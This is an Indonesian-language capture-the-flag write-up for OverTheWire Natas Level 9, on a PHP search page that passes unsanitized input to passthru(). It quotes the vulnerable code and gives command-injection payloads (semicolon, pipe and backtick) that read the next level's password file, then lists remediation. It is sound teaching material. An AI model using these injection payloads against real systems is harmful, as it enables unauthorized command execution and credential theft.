---
title: "Level 9"
description: Injeksi perintah melalui input tidak tersanitasi ke passthru().
sidebarTitle: "Level 9 — Injeksi Perintah"
---

## Profil

- **Target:** `http://natas9.natas.labs.overthewire.org`
- **Kredensial:** `natas9` / (password dari Level 8)

## Pengintaian

Halaman menyediakan fitur pencarian. Kode sumber PHP mengungkapkan implementasi:

```php
$key = $_REQUEST["needle"];

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

## Analisis

Fungsi `passthru()` PHP mengeksekusi perintah melalui shell. Karena input pengguna digabungkan langsung ke string perintah, metakarakter shell akan diinterpretasikan oleh shell. Ini adalah **command injection** (CWE-78).

## Eksploitasi

Operator shell `;` memungkinkan pembuatan rantai perintah. Injeksi:

```
; cat /etc/natas_webpass/natas10
```

Menyebabkan shell mengeksekusi:

```bash
grep -i ; cat /etc/natas_webpass/natas10 dictionary.txt
```

Payload alternatif:

- Pipe: `| cat /etc/natas_webpass/natas10`
- Backticks: `` `cat /etc/natas_webpass/natas10` ``

## Remediasi

- Jangan pernah memberikan input pengguna langsung ke fungsi eksekusi shell
- Gunakan `escapeshellarg()` jika eksekusi shell diperlukan
- Pilih API native bahasa pemrograman daripada perintah shell
